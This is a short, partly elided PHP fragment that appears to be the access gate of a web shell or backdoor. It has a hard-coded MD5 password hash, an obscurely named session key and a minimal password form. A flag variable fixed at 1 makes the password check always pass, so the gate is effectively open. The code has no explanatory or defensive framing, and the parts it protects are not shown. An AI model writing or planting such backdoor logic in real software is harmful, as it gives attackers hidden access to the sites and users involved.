...
$session_time = 30*60;
$flag = 1;
if(time() - $_SESSION['last_rdfgedr_access'] <= $session_time){
    $flag = 1;
}
if((isset($password) && (md5($password) == '3faed027aabdf60de6df0921b98a921f')) || $flag == 1){
    $_SESSION['last_rdfgedr_access'] = time();
...
if (isset($_POST['gecko-submit'])) {
    ...
    echo '<title>pp</title><form action="#" method="post"><input type="text" id="password" name="password" value="" style="width: 300px"><input type="submit" value="submit"/></form>';
}
